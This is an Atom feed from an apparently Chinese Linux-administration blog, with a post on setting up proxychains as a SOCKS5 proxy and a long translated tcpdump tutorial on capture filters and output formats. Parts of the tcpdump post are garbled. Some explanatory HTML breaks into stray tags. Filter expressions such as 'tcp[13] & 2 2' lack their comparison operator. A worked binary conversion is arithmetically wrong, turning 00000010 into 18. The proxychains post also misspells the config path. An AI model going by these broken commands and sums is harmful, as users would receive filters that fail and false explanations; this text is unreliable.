<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Linux运维装逼指南</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.unix-like.com/"/>
  <updated>2017-06-20T03:03:17.737Z</updated>
  <id>http://www.unix-like.com/</id>
  
  <author>
    <name>Linux运维装逼指南</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>利用proxychains在终端使用socks5代理</title>
    <link href="http://www.unix-like.com/2017/06/20/service/%E5%88%A9%E7%94%A8proxychains%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%BD%BF%E7%94%A8socks5%E4%BB%A3%E7%90%86/"/>
    <id>http://www.unix-like.com/2017/06/20/service/利用proxychains在终端使用socks5代理/</id>
    <published>2017-06-20T02:23:10.000Z</published>
    <updated>2017-06-20T03:03:17.737Z</updated>
    
    <content type="html"><![CDATA[<p>最近用各种脚本下载东西的时候发现有的站点需要当地IP才能下，比如…..nico, youtube等；所以就找了下能在终端用socks5代理的工具，最后找到了proxychains，从此再无压力。</p>
<a id="more"></a>
<h1 id="proxychains安装"><a href="#proxychains安装" class="headerlink" title="proxychains安装"></a>proxychains安装</h1><p>ubuntu下安装:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install proxychains</div></pre></td></tr></table></figure>
<p>编译安装:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/rofl0r/proxychains-ng.git</div><div class="line"><span class="built_in">cd</span> proxychains-ng</div><div class="line">./configure</div><div class="line">make</div><div class="line">sudo make install</div><div class="line">sudo cp ./src/proxychains.conf /etc/proxychians.conf</div><div class="line"><span class="built_in">cd</span> .. &amp;&amp; rm -rf proxychains-ng</div></pre></td></tr></table></figure>
<h1 id="编辑proxychains配置"><a href="#编辑proxychains配置" class="headerlink" title="编辑proxychains配置"></a>编辑proxychains配置</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/proxychains.conf</div></pre></td></tr></table></figure>
<p>将socks4 127.0.0.1 9095改为</p>
<p>socks5  127.0.0.1 1080  //1080改为你自己的端口</p>
<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>在需要代理的命令前加上 <code>proxychains</code> ，如：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">proxychains wget http://xxx.com/xxx.zip</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近用各种脚本下载东西的时候发现有的站点需要当地IP才能下，比如…..nico, youtube等；所以就找了下能在终端用socks5代理的工具，最后找到了proxychains，从此再无压力。&lt;/p&gt;
    
    </summary>
    
      <category term="service" scheme="http://www.unix-like.com/categories/service/"/>
    
    
      <category term="proxy" scheme="http://www.unix-like.com/tags/proxy/"/>
    
  </entry>
  
  <entry>
    <title>tcpdump命令详解</title>
    <link href="http://www.unix-like.com/2017/06/16/security/tcpdump%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"/>
    <id>http://www.unix-like.com/2017/06/16/security/tcpdump命令详解/</id>
    <published>2017-06-16T06:41:20.000Z</published>
    <updated>2017-06-16T08:26:56.307Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>用简单的话来定义tcpdump，就是：dump the traffic on a network，根据使用者的定义对网络上的数据包进行截获的包分析工具。 tcpdump可以将网络中传送的数据包的“头”完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。</p>
<a id="more"></a>
<h1 id="实用命令实例"><a href="#实用命令实例" class="headerlink" title="实用命令实例"></a>实用命令实例</h1><h2 id="默认启动"><a href="#默认启动" class="headerlink" title="默认启动"></a>默认启动</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump</div></pre></td></tr></table></figure>
<p>普通情况下，直接启动tcpdump将监视第一个网络接口上所有流过的数据包。</p>
<h2 id="监视指定网络接口的数据包"><a href="#监视指定网络接口的数据包" class="headerlink" title="监视指定网络接口的数据包"></a>监视指定网络接口的数据包</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump -i eth1</div></pre></td></tr></table></figure>
<p>如果不指定网卡，默认tcpdump只会监视第一个网络接口，一般是eth0，下面的例子都没有指定网络接口。　</p>
<h2 id="监视指定主机的数据包"><a href="#监视指定主机的数据包" class="headerlink" title="监视指定主机的数据包"></a>监视指定主机的数据包</h2><p>打印所有进入或离开sundown的数据包.<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump host sundown</div></pre></td></tr></table></figure></p>
<p>也可以指定ip,例如截获所有210.27.48.1 的主机收到的和发出的所有的数据包<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump host 210.27.48.1</div></pre></td></tr></table></figure></p>
<p>打印helios 与 hot 或者与 ace 之间通信的数据包<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump host helios and \( hot or ace \)</div></pre></td></tr></table></figure></p>
<p>截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump host 210.27.48.1 and \ (210.27.48.2 or 210.27.48.3 \)</div></pre></td></tr></table></figure></p>
<p>打印ace与任何其他主机之间通信的IP 数据包, 但不包括与helios之间的数据包.<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump ip host ace and not helios</div></pre></td></tr></table></figure></p>
<p>如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包，使用命令：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump ip host 210.27.48.1 and ! 210.27.48.2</div></pre></td></tr></table></figure></p>
<p>截获主机hostname发送的所有数据<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump -i eth0 src host hostname</div></pre></td></tr></table></figure></p>
<p>监视所有送到主机hostname的数据包<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump -i eth0 dst host hostname</div></pre></td></tr></table></figure></p>
<h2 id="监视指定主机和端口的数据包"><a href="#监视指定主机和端口的数据包" class="headerlink" title="监视指定主机和端口的数据包"></a>监视指定主机和端口的数据包</h2><p>如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump tcp port 23 and host 210.27.48.1</div></pre></td></tr></table></figure></p>
<p>对本机的udp 123 端口进行监视 123 为ntp的服务端口<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump udp port 123</div></pre></td></tr></table></figure></p>
<h2 id="监视指定网络的数据包"><a href="#监视指定网络的数据包" class="headerlink" title="监视指定网络的数据包"></a>监视指定网络的数据包</h2><p>打印本地主机与Berkeley网络上的主机之间的所有通信数据包(nt: ucb-ether, 此处可理解为’Berkeley网络’的网络地址,此表达式最原始的含义可表达为: 打印网络地址为ucb-ether的所有数据包)<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump net ucb-ether</div></pre></td></tr></table></figure></p>
<p>打印所有通过网关snup的ftp数据包(注意, 表达式被单引号括起来了, 这可以防止shell对其中的括号进行错误解析)<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump <span class="string">'gateway snup and (port ftp or ftp-data)'</span></div></pre></td></tr></table></figure></p>
<p>打印所有源地址或目标地址是本地主机的IP数据包</p>
<p>(如果本地网络通过网关连到了另一网络, 则另一网络并不能算作本地网络.(nt: 此句翻译曲折,需补充).localnet 实际使用时要真正替换成本地网络的名字)<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump ip and not net localnet</div></pre></td></tr></table></figure></p>
<h2 id="监视指定协议的数据包"><a href="#监视指定协议的数据包" class="headerlink" title="监视指定协议的数据包"></a>监视指定协议的数据包</h2><p>打印TCP会话中的的开始和结束数据包, 并且数据包的源或目的不是本地网络上的主机.(nt: localnet, 实际使用时要真正替换成本地网络的名字))<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump <span class="string">'tcp[tcpflags] &amp; (tcp-syn|tcp-fin) != 0 and not src and dst net localnet'</span></div></pre></td></tr></table></figure></p>
<p>打印所有源或目的端口是80, 网络层协议为IPv4, 并且含有数据,而不是SYN,FIN以及ACK-only等不含数据的数据包.(ipv6的版本的表达式可做练习)<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump <span class="string">'tcp port 80 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2)) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) != 0)'</span></div></pre></td></tr></table></figure></p>
<p>(nt: 可理解为, ip[2:2]表示整个ip数据包的长度, (ip[0]&amp;0xf)&lt;<2)表示ip数据包包头的长度(ip[0]&0xf代表包中的ihl域, 而此域的单位为32bit,="" 要换算成字节数需要乘以4,　即左移2.　(tcp[12]&0xf0)="">&gt;4 表示tcp头的长度, 此域的单位也是32bit,　换算成比特数为 ((tcp[12]&amp;0xf0) &gt;&gt; 4)　&lt;&lt;　２,　即 ((tcp[12]&amp;0xf0)&gt;&gt;2).　((ip[2:2] - ((ip[0]&amp;0xf)&lt;<2)) -="" ((tcp[12]&0xf0)="">&gt;2)) != 0　表示: 整个ip数据包的长度减去ip头的长度,再减去tcp头的长度不为0, 这就意味着, ip数据包中确实是有数据.对于ipv6版本只需考虑ipv6头中的’Payload Length’ 与 ‘tcp头的长度’的差值, 并且其中表达方式’ip[]’需换成’ip6[]’.)</2))></2)表示ip数据包包头的长度(ip[0]&0xf代表包中的ihl域,></p>
<p>打印长度超过576字节, 并且网关地址是snup的IP数据包<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump <span class="string">'gateway snup and ip[2:2] &gt; 576'</span></div></pre></td></tr></table></figure></p>
<p>打印所有IP层广播或多播的数据包， 但不是物理以太网层的广播或多播数据报<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump <span class="string">'ether[0] &amp; 1 = 0 and ip[16] &gt;= 224'</span></div></pre></td></tr></table></figure></p>
<p>打印除’echo request’或者’echo reply’类型以外的ICMP数据包( 比如,需要打印所有非ping 程序产生的数据包时可用到此表达式 .<br>(nt: ‘echo reuqest’ 与 ‘echo reply’ 这两种类型的ICMP数据包通常由ping程序产生))<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump <span class="string">'icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply'</span></div></pre></td></tr></table></figure></p>
<h2 id="tcpdump-与wireshark"><a href="#tcpdump-与wireshark" class="headerlink" title="tcpdump 与wireshark"></a>tcpdump 与wireshark</h2><p>Wireshark(以前是ethereal)是非常简单易用的抓包工具。但在Linux和windowns下是图形化抓包工具。我们可以用Tcpdump + Wireshark 的完美组合实现：在 Linux 里抓包，然后在Windows 里分析包。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump tcp -i eth1 -t <span class="_">-s</span> 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap</div></pre></td></tr></table></figure></p>
<ol>
<li>tcp: ip icmp arp rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型</li>
<li>-i eth1 : 只抓经过接口eth1的包</li>
<li>-t : 不显示时间戳</li>
<li>-s 0 : 抓取数据包时默认抓取长度为68字节。加上-S 0 后可以抓到完整的数据包</li>
<li>-c 100 : 只抓取100个数据包</li>
<li>dst port ! 22 : 不抓取目标端口是22的数据包</li>
<li>src net 192.168.1.0/24 : 数据包的源网络地址为192.168.1.0/24</li>
<li>-w ./target.cap : 保存成cap文件，方便用ethereal(即wireshark)分析</li>
</ol>
<h2 id="使用tcpdump抓取HTTP包"><a href="#使用tcpdump抓取HTTP包" class="headerlink" title="使用tcpdump抓取HTTP包"></a>使用tcpdump抓取HTTP包</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump  -XvvennSs 0 -i eth0 tcp[20:2]=0x4745 or tcp[20:2]=0x4854</div></pre></td></tr></table></figure>
<p>0x4745 为”GET”前两个字母”GE”,0x4854 为”HTTP”前两个字母”HT”。</p>
<p>tcpdump 对截获的数据并没有进行彻底解码，数据包内的大部分内容是使用十六进制的形式直接打印输出的。显然这不利于分析网络故障，通常的解决办法是先使用带-w参数的tcpdump 截获数据并保存到文件中，然后再使用其他程序(如Wireshark)进行解码分析。当然也应该定义过滤规则，以避免捕获的数据包填满整个硬盘。</p>
<h1 id="输出信息含义"><a href="#输出信息含义" class="headerlink" title="输出信息含义"></a>输出信息含义</h1><p>首先我们注意一下，基本上tcpdump总的的输出格式为：系统时间 来源主机.端口 &gt; 目标主机.端口 数据包参数</p>
<p>tcpdump 的输出格式与协议有关.以下简要描述了大部分常用的格式及相关例子.</p>
<h2 id="链路层头"><a href="#链路层头" class="headerlink" title="链路层头"></a>链路层头</h2><p>对于FDDI网络, ‘-e’ 使tcpdump打印出指定数据包的’frame control’ 域, 源和目的地址, 以及包的长度.(frame control域控制对包中其他域的解析). 一般的包(比如那些IP datagrams)都是带有’async’(异步标志)的数据包，并且有取值0到7的优先级;比如 ‘async4’就代表此包为异步数据包，并且优先级别为4. 通常认为,这些包们会内含一个 LLC包(逻辑链路控制包); 这时,如果此包不是一个ISO datagram或所谓的SNAP包，其LLC头部将会被打印(nt:应该是指此包内含的 LLC包的包头).</p>
<p>对于Token Ring网络(令牌环网络), ‘-e’ 使tcpdump打印出指定数据包的’frame control’和’access control’域, 以及源和目的地址,外加包的长度. 与FDDI网络类似, 此数据包通常内含LLC数据包. 不管 是否有’-e’选项.对于此网络上的’source-routed’类型数据包(nt:意译为:源地址被追踪的数据包,具体含义未知,需补充), 其包的源路由信息总会被打印.</p>
<p>对于802.11网络(WLAN,即wireless local area network), ‘-e’ 使tcpdump打印出指定数据包的’frame control域,包头中包含的所有地址, 以及包的长度.与FDDI网络类似, 此数据包通常内含LLC数据包.</p>
<p>(注意: 以下的描述会假设你熟悉SLIP压缩算法 (nt:SLIP为Serial Line Internet Protocol.), 这个算法可以在RFC-1144中找到相关的蛛丝马迹.)</p>
<p>对于SLIP网络(nt:SLIP links, 可理解为一个网络, 即通过串行线路建立的连接, 而一个简单的连接也可看成一个网络),数据包的’direction indicator’(‘方向指示标志’)(“I”表示入, “O”表示出), 类型以及压缩信息将会被打印. 包类型会被首先打印.</p>
<p>类型分为ip, utcp以及ctcp(nt:未知, 需补充). 对于ip包,连接信息将不被打印(nt:SLIP连接上,ip包的连接信息可能无用或没有定义.reconfirm).对于TCP数据包, 连接标识紧接着类型表示被打印. 如果此包被压缩, 其被编码过的头部将被打印.时对于特殊的压缩包,会如下显示:</p>
<p>*S+n 或者 *SA+n, 其中n代表包的(顺序号或(顺序号和应答号))增加或减少的数目(nt | rt:S,SA拗口, 需再译).对于非特殊的压缩包,0个或更多的’改变’将会被打印.’改变’被打印时格式如下:</p>
<p>‘标志’+/-/=n 包数据的长度 压缩的头部长度.</p>
<p>其中’标志’可以取以下值:</p>
<p>U(代表紧急指针), W(指缓冲窗口), A(应答), S(序列号), I(包ID),而增量表达’=n’表示被赋予新的值, +/-表示增加或减少.</p>
<p>比如, 以下显示了对一个外发压缩TCP数据包的打印, 这个数据包隐含一个连接标识(connection identifier); 应答号增加了6,顺序号增加了49, 包ID号增加了6; 包数据长度为3字节(octect), 压缩头部为6字节.(nt:如此看来这应该不是一个特殊的压缩数据包).</p>
<h2 id="ARP-RARP-数据包"><a href="#ARP-RARP-数据包" class="headerlink" title="ARP/RARP 数据包"></a>ARP/RARP 数据包</h2><p>tcpdump对Arp/rarp包的输出信息中会包含请求类型及该请求对应的参数. 显示格式简洁明了. 以下是从主机rtsg到主机csam的’rlogin’(远程登录)过程开始阶段的数据包样例:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">arp who-has csam tell rtsg</div><div class="line">arp reply csam is-at CSAM</div></pre></td></tr></table></figure></p>
<p>第一行表示:rtsg发送了一个arp数据包(nt:向全网段发送,arp数据包）以询问csam的以太网地址Csam（nt:可从下文看出来, 是Csam）以她自己的以太网地址做了回应(在这个例子中, 以太网地址以大写的名字标识, 而internet地址(即ip地址)以全部的小写名字标识).</p>
<p>如果使用tcpdump -n, 可以清晰看到以太网以及ip地址而不是名字标识:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">arp who-has 128.3.254.6 tell 128.3.254.68</div><div class="line">arp reply 128.3.254.6 is-at 02:07:01:00:01:c4</div></pre></td></tr></table></figure></p>
<p>如果我们使用tcpdump -e, 则可以清晰的看到第一个数据包是全网广播的, 而第二个数据包是点对点的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">RTSG Broadcast 0806 64: arp who-has csam tell rtsg</div><div class="line">CSAM RTSG 0806 64: arp reply csam is-at CSAM</div></pre></td></tr></table></figure></p>
<p>第一个数据包表明:以arp包的源以太地址是RTSG, 目标地址是全以太网段, type域的值为16进制0806(表示ETHER_ARP(nt:arp包的类型标识)),包的总长度为64字节.</p>
<h2 id="TCP-数据包"><a href="#TCP-数据包" class="headerlink" title="TCP 数据包"></a>TCP 数据包</h2><p>(注意:以下将会假定你对 RFC-793所描述的TCP熟悉. 如果不熟, 以下描述以及tcpdump程序可能对你帮助不大.(nt:警告可忽略,只需继续看, 不熟悉的地方可回头再看.).</p>
<p>通常tcpdump对tcp数据包的显示格式如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">src &gt; dst: flags data-seqno ack window urgent options</div></pre></td></tr></table></figure></p>
<p>src 和 dst 是源和目的IP地址以及相应的端口. flags 标志由S(SYN), F(FIN), P(PUSH, R(RST),W(ECN CWT(nt | rep:未知, 需补充))或者 E(ECN-Echo(nt | rep:未知,　需补充))组成,单独一个’.’表示没有flags标识. 数据段顺序号(Data-seqno)描述了此包中数据所对应序列号空间中的一个位置(nt:整个数据被分段,每段有一个顺序号, 所有的顺序号构成一个序列号空间)(可参考以下例子). Ack 描述的是同一个连接,同一个方向,下一个本端应该接收的(对方应该发送的)数据片段的顺序号. Window是本端可用的数据接收缓冲区的大小(也是对方发送数据时需根据这个大小来组织数据).</p>
<p>Urg(urgent) 表示数据包中有紧急的数据. options 描述了tcp的一些选项, 这些选项都用尖括号来表示(如 <mss 1024="">).</mss></p>
<p>src, dst 和 flags 这三个域总是会被显示. 其他域的显示与否依赖于tcp协议头里的信息.</p>
<p>这是一个从trsg到csam的一个rlogin应用登录的开始阶段.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">rtsg.1023 &gt; csam.login: S 768512:768512(0) win 4096 &lt;mss 1024&gt;</div><div class="line">csam.login &gt; rtsg.1023: S 947648:947648(0) ack 768513 win 4096 &lt;mss 1024&gt;</div><div class="line">rtsg.1023 &gt; csam.login: . ack 1 win 4096</div><div class="line">rtsg.1023 &gt; csam.login: P 1:2(1) ack 1 win 4096</div><div class="line">csam.login &gt; rtsg.1023: . ack 2 win 4096</div><div class="line">rtsg.1023 &gt; csam.login: P 2:21(19) ack 1 win 4096</div><div class="line">csam.login &gt; rtsg.1023: P 1:2(1) ack 21 win 4077</div><div class="line">csam.login &gt; rtsg.1023: P 2:3(1) ack 21 win 4077 urg 1</div><div class="line">csam.login &gt; rtsg.1023: P 3:4(1) ack 21 win 4077 urg 1</div></pre></td></tr></table></figure></p>
<p>第一行表示有一个数据包从rtsg主机的tcp端口1023发送到了csam主机的tcp端口login上(nt:udp协议的端口和tcp协议的端口是分别的两个空间, 虽然取值范围一致). S表示设置了SYN标志. 包的顺序号是768512, 并且没有包含数据.(表示格式为:’first:last(nbytes)’, 其含义是’此包中数据的顺序号从first开始直到last结束，不包括last. 并且总共包含nbytes的用户数据’.) 没有捎带应答(nt:从下文来看，第二行才是有捎带应答的数据包), 可用的接受窗口的大小为4096bytes, 并且请求端(rtsg)<br>的最大可接受的数据段大小是1024字节(nt:这个信息作为请求发向应答端csam, 以便双方进一步的协商).</p>
<p>Csam 向rtsg 回复了基本相同的SYN数据包, 其区别只是多了一个’ piggy-backed ack’(nt:捎带回的ack应答, 针对rtsg的SYN数据包).</p>
<p>rtsg 同样针对csam的SYN数据包回复了一ACK数据包作为应答. ‘.’的含义就是此包中没有标志被设置. 由于此应答包中不含有数据, 所以包中也没有数据段序列号. 提醒! 此ACK数据包的顺序号只是一个小整数1. 有如下解释:tcpdump对于一个tcp连接上的会话, 只打印会话两端的初始数据包的序列号,其后相应数据包只打印出与初始包序列号的差异.即初始序列号之后的序列号,　可被看作此会话上当前所传数据片段在整个要传输的数据中的’相对字节’位置(nt:双方的第一个位置都是1, 即’相对字节’的开始编号).　‘-Ｓ’将覆盖这个功能,使数据包的原始顺序号被打印出来.</p>
<p>第六行的含义为:rtsg 向 csam发送了19字节的数据(字节的编号为2到20，传送方向为rtsg到csam). 包中设置了PUSH标志. 在第7行,csam 喊到， 她已经从rtsg中收到了21以下的字节, 但不包括21编号的字节. 这些字节存放在csam的socket的接收缓冲中, 相应地,csam的接收缓冲窗口大小会减少19字节(nt:可以从第5行和第7行win属性值的变化看出来). csam在第7行这个包中也向rtsg发送了一个字节. 在第8行和第9行, csam 继续向rtsg 分别发送了两个只包含一个字节的数据包, 并且这个数据包带PUSH标志.</p>
<p>如果所抓到的tcp包(nt:即这里的snapshot)太小了，以至tcpdump无法完整得到其头部数据, 这时, tcpdump会尽量解析这个不完整的头,并把剩下不能解析的部分显示为’[|tcp]’. 如果头部含有虚假的属性信息(比如其长度属性其实比头部实际长度长或短), tcpdump会为该头部显示’[bad opt]’. 如果头部的长度告诉我们某些选项(nt | rt:从下文来看， 指tcp包的头部中针对ip包的一些选项, 回头再翻)会在此包中,而真正的IP(数据包的长度又不够容纳这些选项, tcpdump会显示’[bad hdr length]’.</p>
<p>抓取带有特殊标志的的TCP包(如SYN-ACK标志, URG-ACK标志等).</p>
<p>在TCP的头部中, 有8比特(bit)用作控制位区域, 其取值为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">CWR | ECE | URG | ACK | PSH | RST | SYN | FIN</div><div class="line">(nt | rt:从表达方式上可推断:这8个位是用或的方式来组合的, 可回头再翻)</div></pre></td></tr></table></figure></p>
<p>现假设我们想要监控建立一个TCP连接整个过程中所产生的数据包. 可回忆如下:TCP使用3次握手协议来建立一个新的连接; 其与此三次握手连接顺序对应，并带有相应TCP控制标志的数据包如下:</p>
<ol>
<li>连接发起方(nt:Caller)发送SYN标志的数据包</li>
<li>接收方(nt:Recipient)用带有SYN和ACK标志的数据包进行回应</li>
<li>发起方收到接收方回应后再发送带有ACK标志的数据包进行回应</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">0 15 31</div><div class="line">-----------------------------------------------------------------</div><div class="line">| source port | destination port |</div><div class="line">-----------------------------------------------------------------</div><div class="line">| sequence number |</div><div class="line">-----------------------------------------------------------------</div><div class="line">| acknowledgment number |</div><div class="line">-----------------------------------------------------------------</div><div class="line">| HL | rsvd |C|E|U|A|P|R|S|F| window size |</div><div class="line">-----------------------------------------------------------------</div><div class="line">| TCP checksum | urgent pointer |</div><div class="line">-----------------------------------------------------------------</div></pre></td></tr></table></figure>
<p>一个TCP头部,在不包含选项数据的情况下通常占用20个字节(nt | rt:options 理解为选项数据，需回译). 第一行包含0到3编号的字节,第二行包含编号4-7的字节.</p>
<p>如果编号从0开始算, TCP控制标志位于13字节(nt:第四行左半部分).</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0 7| 15| 23| 31</div><div class="line">----------------|---------------|---------------|----------------</div><div class="line">| HL | rsvd |C|E|U|A|P|R|S|F| window size |</div><div class="line">----------------|---------------|---------------|----------------</div><div class="line">| | 13th octet | | |</div></pre></td></tr></table></figure>
<p>让我们仔细看看编号13的字节:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">| |</div><div class="line">|---------------|</div><div class="line">|C|E|U|A|P|R|S|F|</div><div class="line">|---------------|</div><div class="line">|7 5 3 0|</div></pre></td></tr></table></figure>
<p>这里有我们感兴趣的控制标志位. 从右往左这些位被依次编号为0到7, 从而 PSH位在3号, 而URG位在5号.</p>
<p>提醒一下自己, 我们只是要得到包含SYN标志的数据包. 让我们看看在一个包的包头中, 如果SYN位被设置, 到底在13号字节发生了什么:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">|C|E|U|A|P|R|S|F|</div><div class="line">|---------------|</div><div class="line">|0 0 0 0 0 0 1 0|</div><div class="line">|---------------|</div><div class="line">|7 6 5 4 3 2 1 0|</div></pre></td></tr></table></figure></p>
<p>在控制段的数据中, 只有比特1(bit number 1)被置位.</p>
<p>假设编号为13的字节是一个8位的无符号字符型,并且按照网络字节号排序(nt:对于一个字节来说，网络字节序等同于主机字节序), 其二进制值如下所示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">00000010</div></pre></td></tr></table></figure></p>
<p>转换成十进制就是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0*2^7 + 0*2^6 + 0*2^5 + 1*2^4 + 0*2^3 + 0*2^2 + 1*2^1 + 0*2 = 18</div></pre></td></tr></table></figure></p>
<p>(nt: 1 * 2^6 表示1乘以2的6次方, 也许这样更清楚些, 即把原来表达中的指数7 6 … 0挪到了下面来表达)</p>
<p>现在, 却不能只用’tcp[13] 18’作为tcpdump的过滤表达式, 因为这将导致只选择含有SYN-ACK标志的数据包, 其他的都被丢弃.</p>
<p>提醒一下自己, 我们的目标是: 只要包的SYN标志被设置就行, 其他的标志我们不理会.</p>
<p>为了达到我们的目标, 我们需要把13号字节的二进制值与其他的一个数做AND操作(nt:逻辑与)来得到SYN比特位的值. 目标是:只要SYN 被设置就行, 于是我们就把她与上13号字节的SYN值(nt: 00000010).<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">00010010 SYN-ACK 00000010 SYN</div><div class="line">AND 00000010 (we want SYN) AND 00000010 (we want SYN)</div><div class="line">-------- --------</div><div class="line">= 00000010 = 00000010</div></pre></td></tr></table></figure></p>
<p>我们可以发现, 不管包的ACK或其他标志是否被设置, 以上的AND操作都会给我们相同的值, 其10进制表达就是2(2进制表达就是00000010).<br>从而我们知道, 对于带有SYN标志的数据包, 以下的表达式的结果总是真(true):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">( ( value of octet 13 ) AND ( 2 ) ) ( 2 ) (nt: value of octet 13, 即13号字节的值)</div></pre></td></tr></table></figure></p>
<p>灵感随之而来, 我们于是得到了如下的tcpdump 的过滤表达式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump -i xl0 &apos;tcp[13] &amp; 2 2&apos;</div></pre></td></tr></table></figure></p>
